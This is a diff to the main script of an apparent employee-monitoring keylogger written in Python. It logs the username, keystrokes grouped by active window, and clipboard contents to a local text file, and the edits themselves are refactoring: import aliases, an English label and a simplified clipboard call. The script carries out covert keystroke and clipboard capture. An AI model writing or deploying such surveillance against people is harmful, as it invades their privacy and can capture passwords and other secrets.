@@ -6,13 +6,11 @@
 ########################################################################################################################
 
 # Library imports here
-import web_and_app_info_logger
-import keystrokes_and_clipboard_logger
+import web_and_app_info_logger as wailogger
+import keystrokes_and_clipboard_logger as kclogger
 import os
 import datetime
 import getpass
-
-event_string = ''
 
 
 # Main code here
@@ -24,11 +22,10 @@ def main():
     user = getpass.getuser()
 
     with open("keyboard_events.txt", 'w') as f:
-        f.write(f"Gebruiker: {user}" + "\n")
+        f.write(f"User: {user}" + "\n")
         f.write("======================================================" + "\n")
-        keylogger = keystrokes_and_clipboard_logger.Keylogger()
+        keylogger = kclogger.Keylogger()
         last_window_title = None
-        new_clipboard = None
         old_clipboard = None
 
         # TECHNICAL DEBT: Currently does not save the logged keys from the last opened application.
@@ -37,7 +34,7 @@ def main():
         # For now, this works well enough under the idea that monitored employees will end at the desktop before
         # shutting down their device
         while True:
-            active_window, active_window_title = web_and_app_info_logger.active_window_grabber()
+            active_window, active_window_title = wailogger.active_window_grabber()
             if active_window_title != last_window_title and keylogger.is_recording:
                 events_queue = keylogger.stop_keylogger_recording()
                 relevant_keys = keylogger.get_down_keypresses(events_queue)
@@ -47,8 +44,7 @@ def main():
                 f.write(f"OPENED {active_window_title} ON {datetime.datetime.now()} \n")
             last_window_title = active_window_title
 
-            old_clipboard, new_clipboard = keystrokes_and_clipboard_logger.copy_clipboard(f, old_clipboard,
-                                                                                          new_clipboard)
+            old_clipboard = kclogger.copy_clipboard(f, old_clipboard)
 
 
 if __name__ == '__main__':
